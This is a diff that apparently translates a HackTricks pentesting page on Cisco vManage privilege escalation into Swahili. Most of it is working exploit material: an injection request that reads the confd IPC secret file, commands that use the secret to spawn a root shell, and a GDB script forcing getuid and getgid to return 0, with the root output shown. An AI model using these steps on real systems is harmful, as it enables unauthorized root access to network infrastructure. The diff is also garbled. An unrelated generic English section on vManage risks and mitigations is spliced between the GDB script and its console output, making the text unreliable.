@@ -2,34 +2,31 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## Path 1
+## Njia 1
 
-(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(Mfano kutoka [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
-
+Baada ya kuchunguza kidogo kupitia [nyaraka](http://66.218.245.39/doc/html/rn03re18.html) zinazohusiana na `confd` na programu za binary tofauti (zinazopatikana kwa akaunti kwenye tovuti ya Cisco), tuligundua kuwa ili kuthibitisha soketi ya IPC, inatumia siri iliyoko katika `/etc/confd/confd_ipc_secret`:
 ```
-vmanage:~$ ls -al /etc/confd/confd_ipc_secret 
+vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-
-Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
-
+Kumbuka kifaa chetu cha Neo4j? Inaendeshwa chini ya mamlaka ya mtumiaji 'vmanage', hivyo kuturuhusu kupata faili kwa kutumia udhaifu uliopita:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
-Host: vmanage-XXXXXX.viptela.net 
+Host: vmanage-XXXXXX.viptela.net
 
 
 
@@ -37,13 +34,11 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-
-The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
-
+Programu ya `confd_cli` haiungi mkono hoja za mstari wa amri lakini inaita `/usr/bin/confd_cli_user` na hoja. Kwa hivyo, tunaweza kuita moja kwa moja `/usr/bin/confd_cli_user` na seti yetu ya hoja. Hata hivyo, haionekani kwa urahisi na mamlaka yetu ya sasa, kwa hivyo tunapaswa kuipata kutoka kwenye rootfs na kuikopy kupitia scp, kusoma msaada, na kuitumia ili kupata kikao cha amri:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
-vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret 
+vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret
 
 vManage:~$ /tmp/confd_cli_user -U 0 -G 0
 
@@ -57,15 +52,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
+## Njia 2
 
-## Path 2
+(Mfano kutoka [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+Blogi¹ ya timu ya synacktiv ilielezea njia nzuri ya kupata kikao cha root, lakini shida ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inaweza kusomwa tu na root. Nilipata njia nyingine ya kuongeza hadi kwa root bila usumbufu kama huo.
 
-The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
-
-When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
-
+Nilipovunja vipande vipande faili ya `/usr/bin/confd_cli`, niliona yafuatayo:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -94,46 +87,82 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-
-When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
-
+Nilipokimbia "ps aux", niliona yafuatayo (_note -g 100 -u 107_)
 ```
-vmanage:~$ ps aux 
+vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
+Nilidhani programu ya "confd_cli" inapitisha kitambulisho cha mtumiaji na kikundi ambacho kilikusanywa kutoka kwa mtumiaji aliyeingia kwenye programu ya "cmdptywrapper".
 
-I hypothesized the “confd\_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+Jaribio langu la kwanza lilikuwa kukimbia moja kwa moja programu ya "cmdptywrapper" na kuiwezesha na `-g 0 -u 0`, lakini lilishindikana. Inaonekana kuna kitambulisho cha faili (-i 1015) kilichoundwa mahali fulani njiani na siwezi kukidanganya.
 
-My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
+Kama ilivyotajwa katika blogu ya synacktiv (mfano wa mwisho), programu ya `confd_cli` haikubali vigezo vya amri ya mstari, lakini naweza kuathiri kwa kutumia kisakuzi na bahati nzuri GDB imejumuishwa kwenye mfumo.
 
-As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
-
-I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+Niliumba skripti ya GDB ambapo nililazimisha API ya `getuid` na `getgid` kurudisha 0. Tangu tayari nina ruhusa ya "vmanage" kupitia RCE ya deserialization, nina idhini ya kusoma moja kwa moja `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
-
 ```
 set environment USER=root
 define root
-   finish
-   set $rax=0
-   continue
+finish
+set $rax=0
+continue
 end
 break getuid
 commands
-   root
+root
 end
 break getgid
 commands
-   root
+root
 end
 run
 ```
+# Cisco vManage
 
-Console Output:
+## Description
 
+Cisco vManage is a cloud-based network management platform that provides centralized control and visibility for Cisco SD-WAN devices. It allows network administrators to monitor, configure, and troubleshoot their SD-WAN infrastructure.
+
+## Privilege Escalation
+
+### Exploiting Misconfigurations
+
+#### Default Credentials
+
+Some versions of Cisco vManage may have default credentials that can be used to gain unauthorized access. Attackers can try common default usernames and passwords to exploit this misconfiguration.
+
+#### Weak Passwords
+
+If weak passwords are used for the Cisco vManage platform, attackers can use brute-force or dictionary attacks to guess the password and gain unauthorized access.
+
+### Exploiting Vulnerabilities
+
+#### Remote Code Execution
+
+If a vulnerability exists in the Cisco vManage platform that allows remote code execution, attackers can exploit it to execute arbitrary commands with elevated privileges.
+
+#### SQL Injection
+
+If the Cisco vManage platform is vulnerable to SQL injection attacks, attackers can manipulate database queries to gain unauthorized access or escalate privileges.
+
+### Exploiting Misconfigured Permissions
+
+If the permissions on the Cisco vManage platform are misconfigured, attackers can exploit this to gain unauthorized access or escalate privileges. This can include misconfigured file or directory permissions, allowing attackers to read, write, or execute files they shouldn't have access to.
+
+## Mitigation
+
+To mitigate privilege escalation risks in Cisco vManage, follow these best practices:
+
+- Change default credentials immediately after installation.
+- Use strong passwords that are resistant to brute-force or dictionary attacks.
+- Regularly update the Cisco vManage platform to patch any known vulnerabilities.
+- Implement proper access controls and permissions to prevent unauthorized access.
+- Regularly review and audit the configuration of Cisco vManage to identify and fix any misconfigurations.
+
+By following these best practices, you can reduce the risk of privilege escalation attacks on your Cisco vManage platform.
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -167,15 +196,14 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
